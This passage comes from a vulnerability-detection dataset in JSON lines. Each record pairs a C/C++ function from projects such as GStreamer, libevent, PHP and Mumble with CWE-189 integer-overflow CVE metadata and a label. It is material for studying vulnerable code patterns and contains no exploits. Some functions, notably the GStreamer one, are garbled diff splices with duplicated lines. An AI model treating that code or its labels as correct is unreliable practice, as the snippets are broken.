    if(s->avctx->framerate.den == 0){\n                    av_log(s, AV_LOG_ERROR, \"zero framerate\\n\");\n                    return -1;\n                }\n                gcd= av_gcd(s->avctx->framerate.den, s->avctx->framerate.num);\n                s->avctx->framerate.den /= gcd;\n                s->avctx->framerate.num /= gcd;\n            }else{\n                s->avctx->framerate = (AVRational){ 30000, 1001 };\n            }\n        }\n\n        if(s->custom_pcf){\n            skip_bits(&s->gb, 2); //extended Temporal reference\n        }\n\n        if (ufep) {\n            if (s->umvplus) {\n                if(get_bits1(&s->gb)==0) /* Unlimited Unrestricted Motion Vectors Indicator (UUI) */\n                    skip_bits1(&s->gb);\n            }\n            if(s->h263_slice_structured){\n                if (get_bits1(&s->gb) != 0) {\n                    av_log(s->avctx, AV_LOG_ERROR, \"rectangular slices not supported\\n\");\n                }\n                if (get_bits1(&s->gb) != 0) {\n                    av_log(s->avctx, AV_LOG_ERROR, \"unordered slices not supported\\n\");\n                }\n            }\n        }\n         s->qscale = get_bits(&s->gb, 5);\n     }\n \n    if ((ret = av_image_check_size(s->width, s->height, 0, s)) < 0)\n        return ret;\n\n     s->mb_width = (s->width  + 15) / 16;\n     s->mb_height = (s->height  + 15) / 16;\n     s->mb_num = s->mb_width * s->mb_height;\n        skip_bits(&s->gb, 3); /* Temporal reference for B-pictures */\n        if (s->custom_pcf)\n            skip_bits(&s->gb, 2); //extended Temporal reference\n        skip_bits(&s->gb, 2); /* Quantization information for B-pictures */\n    }\n", "func_hash": 9714376432014589829487855083833822176, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-5479", "cve_desc": "The ff_h263_decode_mba function in libavcodec/ituh263dec.c in Libav before 11.5 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a file with crafted dimensions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-5479"}
{"idx": 194617, "project": "gstreamer", "commit_id": "566583e87147f774e7fc4c78b5f7e61d427e40a9", "project_url": "https://github.com/GStreamer/gstreamer", "commit_url": "https://cgit.freedesktop.org/gstreamer/gst-plugins-base/commit/?id=566583e87147f774e7fc4c78b5f7e61d427e40a9", "commit_message": "vorbistag: Protect memory allocation calculation from overflow.\n\nPatch by: Tomas Hoger <thoger@redhat.com> Fixes CVE-2009-0586", "target": 0, "func": "gst_vorbis_tag_add_coverart (GstTagList * tags, const gchar * img_data_base64,\ngst_vorbis_tag_add_coverart (GstTagList * tags, gchar * img_data_base64,\n     gint base64_len)\n {\n   GstBuffer *img;\n   gsize img_len;\n  guchar *out;\n   guint save = 0;\n   gint state = 0;\n \n   if (base64_len < 2)\n     goto not_enough_data;\n \n  /* img_data_base64 points to a temporary copy of the base64 encoded data, so\n   * it's safe to do inpace decoding here\n   * TODO: glib 2.20 and later provides g_base64_decode_inplace, so change this\n   * to use glib's API instead once it's in wider use:\n   *  http://bugzilla.gnome.org/show_bug.cgi?id=564728\n   *  http://svn.gnome.org/viewvc/glib?view=revision&revision=7807 */\n  out = (guchar *) img_data_base64;\n  img_len = g_base64_decode_step (img_data_base64, base64_len,\n      out, &state, &save);\n \n   if (img_len == 0)\n     goto decode_failed;\n \n  img = gst_tag_image_data_to_image_buffer (out, img_len,\n       GST_TAG_IMAGE_TYPE_NONE);\n \n   if (img == NULL)\n  gst_tag_list_add (tags, GST_TAG_MERGE_APPEND,\n      GST_TAG_PREVIEW_IMAGE, img, NULL);\n\n       GST_TAG_PREVIEW_IMAGE, img, NULL);\n \n   gst_buffer_unref (img);\n   return;\n \n /* ERRORS */\n  {\n    GST_WARNING (\"COVERART tag with too little base64-encoded data\");\n     GST_WARNING (\"COVERART tag with too little base64-encoded data\");\n     return;\n   }\n decode_failed:\n   {\n    GST_WARNING (\"Couldn't decode base64 image data from COVERART tag\");\n     return;\n   }\n convert_failed:\n   {\n     GST_WARNING (\"Couldn't extract image or image type from COVERART tag\");\n     return;\n   }\n }\n", "func_hash": 289066988325537188766960422187487712893, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0586", "cve_desc": "Integer overflow in the gst_vorbis_tag_add_coverart function (gst-libs/gst/tag/gstvorbistag.c) in vorbistag in gst-plugins-base (aka gstreamer-plugins-base) before 0.10.23 in GStreamer allows context-dependent attackers to execute arbitrary code via a crafted COVERART tag that is converted from a base64 representation, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0586"}
{"idx": 227093, "project": "hhvm", "commit_id": "1f91e076a585118495b976a413c1df40f6fd3d41", "project_url": "https://github.com/facebook/hhvm", "commit_url": "https://github.com/facebook/hhvm/commit/1f91e076a585118495b976a413c1df40f6fd3d41", "commit_message": "Fix integer overflow in chunk_split\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1515947", "target": 0, "func": "String string_chunk_split(const char *src, int srclen, const char *end,\n                          int endlen, int chunklen) {\n  int chunks = srclen / chunklen; // complete chunks!\n  int restlen = srclen - chunks * chunklen; /* srclen % chunklen */\n\n  String ret(\n    safe_address(\n      chunks + 1,\n      endlen,\n      srclen\n    ),\n    ReserveString\n  );\n  char *dest = ret.bufferSlice().ptr;\n\n  const char *p; char *q;\n  const char *pMax = src + srclen - chunklen + 1;\n  for (p = src, q = dest; p < pMax; ) {\n    memcpy(q, p, chunklen);\n    q += chunklen;\n    memcpy(q, end, endlen);\n    q += endlen;\n    p += chunklen;\n  }\n\n  if (restlen) {\n    memcpy(q, p, restlen);\n    q += restlen;\n    memcpy(q, end, endlen);\n    q += endlen;\n  }\n\n  ret.setSize(q - dest);\n  return ret;\n}", "func_hash": 265839374442538376451258424323196930297, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-6228", "cve_desc": "Integer overflow in the string_chunk_split function in hphp/runtime/base/zend-string.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted arguments to the chunk_split function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6228"}
{"idx": 305522, "project": "libreswan", "commit_id": "9b31deafbdbf0c2206358dfbf2d4e343e365f23f", "project_url": "https://github.com/libreswan/libreswan", "commit_url": "https://github.com/libreswan/libreswan/commit/9b31deafbdbf0c2206358dfbf2d4e343e365f23f", "commit_message": "SECURITY: Do not inspect or continue on very short packets\n\nCode introduced in Openswan to ensure the IKEv2 minor was ignored\nintroduced a vulnerability that caused mangled short IKE packets to\nbe processed as valid IKE packets despite in_struct() returning a\nfailure, resulting in pluto crashing and restarting.\n\nReported by Nick Howitt.\n\nAdditionally, with the introduction of IKEv2, incoming packets always\nassumed it could at least read the IKE Major version number, and would\ncrash when the packet was overly short and did not contain such a number\n\nThis patch ensures the code not attempt to read the IKE version and might cause an\nIKEv1 packet to be sent as response to a badly mangled IKEv2 packet, as\nwe default to IKEv1 for this type of error. It also no longer skips aborting\na failed in_struct() read.\n\nIt turns the version number in a loose enum.\n\nSigned-off-by: Paul Wouters <pwouters@redhat.com>", "target": 0, "func": "void process_packet(struct msg_digest **mdp)\n{\n\tstruct msg_digest *md = *mdp;\n\tstruct state *st = NULL;\n\tint vmaj, vmin;\n\tenum state_kind from_state = STATE_UNDEFINED;   /* state we started in */\n\n#define SEND_NOTIFICATION(t) { \\\n\t\tif (st) \\\n\t\t\tsend_notification_from_state(st, from_state, t); \\\n\t\telse \\\n\t\t\tsend_notification_from_md(md, t); }\n\n\tif (!in_struct(&md->hdr, &isakmp_hdr_desc, &md->packet_pbs,\n\t\t       &md->message_pbs)) {\n\t\t/*\n\t\t * The packet was very badly mangled. We can't be sure of any\n\t\t * content - not even to look for major version number!\n\t\t * So we'll just silently drop it\n\t\t */\n\t\tlibreswan_log(\"Received packet with mangled IKE header - dropped\");\n\t\tSEND_NOTIFICATION(PAYLOAD_MALFORMED);\n\t\treturn;\n\t}\n\n\tif (md->packet_pbs.roof < md->message_pbs.roof) {\n\t\t/* I don't think this can happen if in_struct() did not fail */\n\t\tlibreswan_log(\n\t\t\t\"received packet size (%u) is smaller than from \"\n\t\t\t\"size specified in ISAKMP HDR (%u) - packet dropped\",\n\t\t\t(unsigned) pbs_room(&md->packet_pbs),\n\t\t\tmd->hdr.isa_length);\n\t\t/* abort processing corrupt packet */\n\t\treturn;\n\t} else if (md->packet_pbs.roof > md->message_pbs.roof) {\n\t\t/*\n\t\t * Some (old?) versions of the Cisco VPN client send an additional\n\t\t * 16 bytes of zero bytes - Complain but accept it\n\t\t */\n\t\tDBG(DBG_CONTROL, {\n\t\t\tDBG_log(\n\t\t\t\"size (%u) in received packet is larger than the size \"\n\t\t\t\"specified in ISAKMP HDR (%u) - ignoring extraneous bytes\",\n\t\t\t(unsigned) pbs_room(&md->packet_pbs),\n\t\t\tmd->hdr.isa_length);\n\t\t\tDBG_dump(\"extraneous bytes:\", md->message_pbs.roof,\n\t\t\t\tmd->packet_pbs.roof - md->message_pbs.roof);\n\t\t});\n\t}\n\n\tvmaj = md->hdr.isa_version >> ISA_MAJ_SHIFT;\n\tvmin = md->hdr.isa_version & ISA_MIN_MASK;\n\n\tswitch (vmaj) {\n\tcase ISAKMP_MAJOR_VERSION:\n\t\tif (vmin > ISAKMP_MINOR_VERSION) {\n\t\t\t/* RFC2408 3.1 ISAKMP Header Format:\n\t\t\t *\n\t\t\t * Minor Version (4 bits) - indicates the minor\n\t\t\t * version of the ISAKMP protocol in use.\n\t\t\t * Implementations based on this version of the\n\t\t\t * ISAKMP Internet-Draft MUST set the Minor\n\t\t\t * Version to 0.  Implementations based on\n\t\t\t * previous versions of ISAKMP Internet- Drafts\n\t\t\t * MUST set the Minor Version to 1.\n\t\t\t * Implementations SHOULD never accept packets\n\t\t\t * with a minor version number larger than its\n\t\t\t * own, given the major version numbers are\n\t\t\t * identical.\n\t\t\t */\n\t\t\tlibreswan_log(\"ignoring packet with IKEv1 minor version number %d greater than %d\", vmin, ISAKMP_MINOR_VERSION);\n\t\t\tSEND_NOTIFICATION(INVALID_MINOR_VERSION);\n\t\t\treturn;\n\t\t}\n\t\tDBG(DBG_CONTROL,\n\t\t    DBG_log(\" processing version=%u.%u packet with exchange type=%s (%d)\",\n\t\t\t    vmaj, vmin,\n\t\t\t    enum_name(&exchange_names_ikev1orv2, md->hdr.isa_xchg),\n\t\t\t    md->hdr.isa_xchg));\n\t\tprocess_v1_packet(mdp);\n\t\tbreak;\n\n\tcase IKEv2_MAJOR_VERSION:\n\t\tif (vmin != IKEv2_MINOR_VERSION) {\n\t\t\t/*\n\t\t\t * Unlike IKEv1, for IKEv2 we are supposed to try and\n\t\t\t * continue on unknown minors\n\t\t\t */\n\t\t\tlibreswan_log(\"ignoring unknown IKEv2 minor version number %d\", vmin);\n\t\t}\n\t\tDBG(DBG_CONTROL,\n\t\t    DBG_log(\" processing version=%u.%u packet with exchange type=%s (%d)\",\n\t\t\t    vmaj, vmin,\n\t\t\t    enum_name(&exchange_names_ikev1orv2, md->hdr.isa_xchg),\n\t\t\t    md->hdr.isa_xchg));\n\t\tprocess_v2_packet(mdp);\n\t\tbreak;\n\n\tdefault:\n\t\tlibreswan_log(\"Unexpected IKE major '%d'\",vmaj);\n\t\tSEND_NOTIFICATION(INVALID_MAJOR_VERSION);\n\t\treturn;\n\t}\n#undef SEND_NOTIFICATION\n}", "func_hash": 101988141771400319810969309521992475946, "file_name": "demux.c", "file_hash": 115007169366432070511246402933578256019, "cwe": ["CWE-189"], "cve": "CVE-2013-4564", "cve_desc": "Libreswan 3.6 allows remote attackers to cause a denial of service (crash) via a small length value and (1) no version or (2) an invalid major number in an IKE packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4564"}
{"idx": 305741, "project": "php-src", "commit_id": "158d8a6b088662ce9d31e0c777c6ebe90efdc854", "project_url": "https://github.com/php/php-src", "commit_url": "http://git.php.net/?p=php-src.git;a=commitdiff;h=158d8a6b088662ce9d31e0c777c6ebe90efdc854", "commit_message": "fix unchecked emalloc", "target": 0, "func": "static int phar_tar_process_metadata(phar_entry_info *entry, php_stream *fp TSRMLS_DC) /* {{{ */\n{\n\tchar *metadata;\n\tsize_t save = php_stream_tell(fp), read;\n\tphar_entry_info *mentry;\n\n\tmetadata = (char *) safe_emalloc(1, entry->uncompressed_filesize, 1);\n\n\tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n\tif (read != entry->uncompressed_filesize) {\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (phar_parse_metadata(&metadata, &entry->metadata, entry->uncompressed_filesize TSRMLS_CC) == FAILURE) {\n\t\t/* if not valid serialized data, it is a regular string */\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (entry->filename_len == sizeof(\".phar/.metadata.bin\")-1 && !memcmp(entry->filename, \".phar/.metadata.bin\", sizeof(\".phar/.metadata.bin\")-1)) {\n\t\tentry->phar->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t} else if (entry->filename_len >= sizeof(\".phar/.metadata/\") + sizeof(\"/.metadata.bin\") - 1 && SUCCESS == zend_hash_find(&(entry->phar->manifest), entry->filename + sizeof(\".phar/.metadata/\") - 1, entry->filename_len - (sizeof(\"/.metadata.bin\") - 1 + sizeof(\".phar/.metadata/\") - 1), (void *)&mentry)) {\n\t\t/* transfer this metadata to the entry it refers */\n\t\tmentry->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t}\n\n\tefree(metadata);\n\tphp_stream_seek(fp, save, SEEK_SET);\n\treturn SUCCESS;\n}", "func_hash": 233449039787058463918506865714534335931, "file_name": "tar.c", "file_hash": 121940513997505788339335558147118393008, "cwe": ["CWE-189"], "cve": "CVE-2012-2386", "cve_desc": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2386"}
{"idx": 335782, "project": "mumble", "commit_id": "d3be3d7b96a5130e4b20f23e327b040ea4d0b079", "project_url": "https://github.com/mumble-voip/mumble", "commit_url": "https://github.com/mumble-voip/mumble/commit/d3be3d7b96a5130e4b20f23e327b040ea4d0b079", "commit_message": "mumble: fix Mumble-SA-2014-002 (CVE-2014-0045).", "target": 0, "func": "bool AudioOutputSpeech::needSamples(unsigned int snum) {\n\tfor (unsigned int i=iLastConsume;i<iBufferFilled;++i)\n\t\tpfBuffer[i-iLastConsume]=pfBuffer[i];\n\tiBufferFilled -= iLastConsume;\n\n\tiLastConsume = snum;\n\n\tif (iBufferFilled >= snum)\n\t\treturn bLastAlive;\n\n\tfloat *pOut;\n\tbool nextalive = bLastAlive;\n\n\twhile (iBufferFilled < snum) {\n\t\tint decodedSamples = iFrameSize;\n\t\tresizeBuffer(iBufferFilled + iOutputSize);\n\n\t\tpOut = (srs) ? fResamplerBuffer : (pfBuffer + iBufferFilled);\n\n\t\tif (! bLastAlive) {\n\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t} else {\n\t\t\tif (p == &LoopUser::lpLoopy) {\n\t\t\t\tLoopUser::lpLoopy.fetchFrames();\n\t\t\t}\n\n\t\t\tint avail = 0;\n\t\t\tint ts = jitter_buffer_get_pointer_timestamp(jbJitter);\n\t\t\tjitter_buffer_ctl(jbJitter, JITTER_BUFFER_GET_AVAILABLE_COUNT, &avail);\n\n\t\t\tif (p && (ts == 0)) {\n\t\t\t\tint want = iroundf(p->fAverageAvailable);\n\t\t\t\tif (avail < want) {\n\t\t\t\t\t++iMissCount;\n\t\t\t\t\tif (iMissCount < 20) {\n\t\t\t\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t\t\t\t\tgoto nextframe;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (qlFrames.isEmpty()) {\n\t\t\t\tQMutexLocker lock(&qmJitter);\n\n\t\t\t\tchar data[4096];\n\t\t\t\tJitterBufferPacket jbp;\n\t\t\t\tjbp.data = data;\n\t\t\t\tjbp.len = 4096;\n\n\t\t\t\tspx_int32_t startofs = 0;\n\n\t\t\t\tif (jitter_buffer_get(jbJitter, &jbp, iFrameSize, &startofs) == JITTER_BUFFER_OK) {\n\t\t\t\t\tPacketDataStream pds(jbp.data, jbp.len);\n\n\t\t\t\t\tiMissCount = 0;\n\t\t\t\t\tucFlags = static_cast<unsigned char>(pds.next());\n\n\t\t\t\t\tbHasTerminator = false;\n\t\t\t\t\tif (umtType == MessageHandler::UDPVoiceOpus) {\n\t\t\t\t\t\tint size;\n\t\t\t\t\t\tpds >> size;\n\n\t\t\t\t\t\tbHasTerminator = size & 0x2000;\n\t\t\t\t\t\tqlFrames << pds.dataBlock(size & 0x1fff);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tunsigned int header = 0;\n\t\t\t\t\t\tdo {\n\t\t\t\t\t\t\theader = static_cast<unsigned int>(pds.next());\n\t\t\t\t\t\t\tif (header)\n\t\t\t\t\t\t\t\tqlFrames << pds.dataBlock(header & 0x7f);\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tbHasTerminator = true;\n\t\t\t\t\t\t} while ((header & 0x80) && pds.isValid());\n\t\t\t\t\t}\n\n\t\t\t\t\tif (pds.left()) {\n\t\t\t\t\t\tpds >> fPos[0];\n\t\t\t\t\t\tpds >> fPos[1];\n\t\t\t\t\t\tpds >> fPos[2];\n\t\t\t\t\t} else {\n\t\t\t\t\t\tfPos[0] = fPos[1] = fPos[2] = 0.0f;\n\t\t\t\t\t}\n\n\t\t\t\t\tif (p) {\n\t\t\t\t\t\tfloat a = static_cast<float>(avail);\n\t\t\t\t\t\tif (avail >= p->fAverageAvailable)\n\t\t\t\t\t\t\tp->fAverageAvailable = a;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tp->fAverageAvailable *= 0.99f;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tjitter_buffer_update_delay(jbJitter, &jbp, NULL);\n\n\t\t\t\t\tiMissCount++;\n\t\t\t\t\tif (iMissCount > 10)\n\t\t\t\t\t\tnextalive = false;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (! qlFrames.isEmpty()) {\n\t\t\t\tQByteArray qba = qlFrames.takeFirst();\n\n\t\t\t\tif (umtType == MessageHandler::UDPVoiceCELTAlpha || umtType == MessageHandler::UDPVoiceCELTBeta) {\n\t\t\t\t\tint wantversion = (umtType == MessageHandler::UDPVoiceCELTAlpha) ? g.iCodecAlpha : g.iCodecBeta;\n\t\t\t\t\tif ((p == &LoopUser::lpLoopy) && (! g.qmCodecs.isEmpty())) {\n\t\t\t\t\t\tQMap<int, CELTCodec *>::const_iterator i = g.qmCodecs.constEnd();\n\t\t\t\t\t\t--i;\n\t\t\t\t\t\twantversion = i.key();\n\t\t\t\t\t}\n\t\t\t\t\tif (cCodec && (cCodec->bitstreamVersion() != wantversion)) {\n\t\t\t\t\t\tcCodec->celt_decoder_destroy(cdDecoder);\n\t\t\t\t\t\tcdDecoder = NULL;\n\t\t\t\t\t}\n\t\t\t\t\tif (! cCodec) {\n\t\t\t\t\t\tcCodec = g.qmCodecs.value(wantversion);\n\t\t\t\t\t\tif (cCodec) {\n\t\t\t\t\t\t\tcdDecoder = cCodec->decoderCreate();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (cdDecoder)\n\t\t\t\t\t\tcCodec->decode_float(cdDecoder, qba.isEmpty() ? NULL : reinterpret_cast<const unsigned char *>(qba.constData()), qba.size(), pOut);\n\t\t\t\t\telse\n\t\t\t\t\t\tmemset(pOut, 0, sizeof(float) * iFrameSize);\n\t\t\t\t} else if (umtType == MessageHandler::UDPVoiceOpus) {\n#ifdef USE_OPUS\n\t\t\t\t\tdecodedSamples = opus_decode_float(opusState,\n\t\t\t\t\t                                   qba.isEmpty() ?\n\t\t\t\t\t                                       NULL :\n\t\t\t\t\t                                       reinterpret_cast<const unsigned char *>(qba.constData()),\n\t\t\t\t\t                                   qba.size(),\n\t\t\t\t\t                                   pOut,\n\t\t\t\t\t                                   iAudioBufferSize,\n\t\t\t\t\t                                   0);\n\t\t\t\t\tif (decodedSamples < 0) {\n\t\t\t\t\t\tdecodedSamples = iFrameSize;\n\t\t\t\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t\t\t\t}\n#endif\n\t\t\t\t} else {\n\t\t\t\t\tif (qba.isEmpty()) {\n\t\t\t\t\t\tspeex_decode(dsSpeex, NULL, pOut);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tspeex_bits_read_from(&sbBits, qba.data(), qba.size());\n\t\t\t\t\t\tspeex_decode(dsSpeex, &sbBits, pOut);\n\t\t\t\t\t}\n\t\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\t\tpOut[i] *= (1.0f / 32767.f);\n\t\t\t\t}\n\n\t\t\t\tbool update = true;\n\t\t\t\tif (p) {\n\t\t\t\t\tfloat &fPowerMax = p->fPowerMax;\n\t\t\t\t\tfloat &fPowerMin = p->fPowerMin;\n\n\t\t\t\t\tfloat pow = 0.0f;\n\t\t\t\t\tfor (int i = 0; i < decodedSamples; ++i)\n\t\t\t\t\t\tpow += pOut[i] * pOut[i];\n\t\t\t\t\tpow = sqrtf(pow / static_cast<float>(decodedSamples));\n\n\t\t\t\t\tif (pow >= fPowerMax) {\n\t\t\t\t\t\tfPowerMax = pow;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (pow <= fPowerMin) {\n\t\t\t\t\t\t\tfPowerMin = pow;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tfPowerMax = 0.99f * fPowerMax;\n\t\t\t\t\t\t\tfPowerMin += 0.0001f * pow;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tupdate = (pow < (fPowerMin + 0.01f * (fPowerMax - fPowerMin)));\n\t\t\t\t}\n\t\t\t\tif (qlFrames.isEmpty() && update)\n\t\t\t\t\tjitter_buffer_update_delay(jbJitter, NULL, NULL);\n\n\t\t\t\tif (qlFrames.isEmpty() && bHasTerminator)\n\t\t\t\t\tnextalive = false;\n\t\t\t} else {\n\t\t\t\tif (umtType == MessageHandler::UDPVoiceCELTAlpha || umtType == MessageHandler::UDPVoiceCELTBeta) {\n\t\t\t\t\tif (cdDecoder)\n\t\t\t\t\t\tcCodec->decode_float(cdDecoder, NULL, 0, pOut);\n\t\t\t\t\telse\n\t\t\t\t\t\tmemset(pOut, 0, sizeof(float) * iFrameSize);\n\t\t\t\t} else if (umtType == MessageHandler::UDPVoiceOpus) {\n#ifdef USE_OPUS\n\t\t\t\t\tdecodedSamples = opus_decode_float(opusState, NULL, 0, pOut, iFrameSize, 0);\n\t\t\t\t\tif (decodedSamples < 0) {\n\t\t\t\t\t\tdecodedSamples = iFrameSize;\n\t\t\t\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t\t\t\t}\n#endif\n\t\t\t\t} else {\n\t\t\t\t\tspeex_decode(dsSpeex, NULL, pOut);\n\t\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\t\tpOut[i] *= (1.0f / 32767.f);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (! nextalive) {\n\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\tpOut[i] *= fFadeOut[i];\n\t\t\t} else if (ts == 0) {\n\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\tpOut[i] *= fFadeIn[i];\n\t\t\t}\n\n\t\t\tfor (int i = decodedSamples / iFrameSize; i > 0; --i) {\n\t\t\t\tjitter_buffer_tick(jbJitter);\n\t\t\t}\n\t\t}\nnextframe:\n\t\tspx_uint32_t inlen = decodedSamples;\n\t\tspx_uint32_t outlen = static_cast<unsigned int>(ceilf(static_cast<float>(decodedSamples * iMixerFreq) / static_cast<float>(iSampleRate)));\n\t\tif (srs && bLastAlive)\n\t\t\tspeex_resampler_process_float(srs, 0, fResamplerBuffer, &inlen, pfBuffer + iBufferFilled, &outlen);\n\t\tiBufferFilled += outlen;\n\t}\n\n\tif (p) {\n\t\tSettings::TalkState ts;\n\t\tif (! nextalive)\n\t\t\tucFlags = 0xFF;\n\t\tswitch (ucFlags) {\n\t\t\tcase 0:\n\t\t\t\tts = Settings::Talking;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tts = Settings::Shouting;\n\t\t\t\tbreak;\n\t\t\tcase 0xFF:\n\t\t\t\tts = Settings::Passive;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tts = Settings::Whispering;\n\t\t\t\tbreak;\n\t\t}\n\t\tp->setTalking(ts);\n\t}\n\n\tbool tmp = bLastAlive;\n\tbLastAlive = nextalive;\n\treturn tmp;\n}", "func_hash": 318177891352209826453506423493951353817, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-0045", "cve_desc": "The needSamples method in AudioOutputSpeech.cpp in the client in Mumble 1.2.4 and the 1.2.3 pre-release snapshots, Mumble for iOS 1.1 through 1.2.2, and MumbleKit before commit fd190328a9b24d37382b269a5674b0c0c7a7e36d does not check the return value of the opus_decode_float function, which allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted Opus voice packet, which triggers an error in opus_decode_float, a conversion of a negative integer to an unsigned integer, and a heap-based buffer over-read and over-write.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0045"}
{"idx": 338737, "project": "libevent", "commit_id": "7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "project_url": "https://github.com/libevent/libevent", "commit_url": "https://github.com/libevent/libevent/commit/7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "commit_message": "Fix CVE-2014-6272 in Libevent 1.4\n\nFor this fix, we need to make sure that passing too-large inputs to\nthe evbuffer functions can't make us do bad things with the heap.", "target": 0, "func": "evbuffer_expand(struct evbuffer *buf, size_t datlen)\n{\n\tsize_t used = buf->misalign + buf->off;\n\tsize_t need;\n\n\tassert(buf->totallen >= used);\n\n\t/* If we can fit all the data, then we don't have to do anything */\n\tif (buf->totallen - used >= datlen)\n\t\treturn (0);\n\t/* If we would need to overflow to fit this much data, we can't\n\t * do anything. */\n\tif (datlen > SIZE_MAX - buf->off)\n\t\treturn (-1);\n\n\t/*\n\t * If the misalignment fulfills our data needs, we just force an\n\t * alignment to happen.  Afterwards, we have enough space.\n\t */\n\tif (buf->totallen - buf->off >= datlen) {\n\t\tevbuffer_align(buf);\n\t} else {\n\t\tvoid *newbuf;\n\t\tsize_t length = buf->totallen;\n\t\tsize_t need = buf->off + datlen;\n\n\t\tif (length < 256)\n\t\t\tlength = 256;\n\t\tif (need < SIZE_MAX / 2) {\n\t\t\twhile (length < need) {\n\t\t\t\tlength <<= 1;\n\t\t\t}\n\t\t} else {\n\t\t\tlength = need;\n\t\t}\n\n\t\tif (buf->orig_buffer != buf->buffer)\n\t\t\tevbuffer_align(buf);\n\t\tif ((newbuf = realloc(buf->buffer, length)) == NULL)\n\t\t\treturn (-1);\n\n\t\tbuf->orig_buffer = buf->buffer = newbuf;\n\t\tbuf->totallen = length;\n\t}\n\n\treturn (0);\n}", "func_hash": 268520221436341227134191327493487157801, "file_name": "buffer.c", "file_hash": 95787474149316772681125473927782811467, "cwe": ["CWE-189"], "cve": "CVE-2014-6272", "cve_desc": "Multiple integer overflows in the evbuffer API in Libevent 1.4.x before 1.4.15, 2.0.x before 2.0.22, and 2.1.x before 2.1.5-beta allow context-dependent attackers to cause a denial of service or possibly have other unspecified impact via \"insanely large inputs\" to the (1) evbuffer_add, (2) evbuffer_expand, or (3) bufferevent_write function, which triggers a heap-based buffer overflow or an infinite loop.  NOTE: this identifier has been SPLIT per ADT3 due to different affected versions. See CVE-2015-6525 for the functions that are only affected in 2.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6272"}
{"idx": 338735, "project": "libevent", "commit_id": "7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "project_url": "https://github.com/libevent/libevent", "commit_url": "https://github.com/libevent/libevent/commit/7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "commit_message": "Fix CVE-2014-6272 in Libevent 1.4\n\nFor this fix, we need to make sure that passing too-large inputs to\nthe evbuffer functions can't make us do bad things with the heap.", "target": 0, "func": "evbuffer_add(struct evbuffer *buf, const void *data, size_t datlen)\n{\n\tsize_t used = buf->misalign + buf->off;\n\tsize_t oldoff = buf->off;\n\n\tif (buf->totallen - used < datlen) {\n\t\tif (evbuffer_expand(buf, datlen) == -1)\n\t\t\treturn (-1);\n\t}\n\n\tmemcpy(buf->buffer + buf->off, data, datlen);\n\tbuf->off += datlen;\n\n\tif (datlen && buf->cb != NULL)\n\t\t(*buf->cb)(buf, oldoff, buf->off, buf->cbarg);\n\n\treturn (0);\n}", "func_hash": 207201496878314971052412624396752756978, "file_name": "buffer.c", "file_hash": 95787474149316772681125473927782811467, "cwe": ["CWE-189"], "cve": "CVE-2014-6272", "cve_desc": "Multiple integer overflows in the evbuffer API in Libevent 1.4.x before 1.4.15, 2.0.x before 2.0.22, and 2.1.x before 2.1.5-beta allow context-dependent attackers to cause a denial of service or possibly have other unspecified impact via \"insanely large inputs\" to the (1) evbuffer_add, (2) evbuffer_expand, or (3) bufferevent_write function, which triggers a heap-based buffer overflow or an infinite loop.  NOTE: this identifier has been SPLIT per ADT3 due to different affected versions. See CVE-2015-6525 for the functions that are only 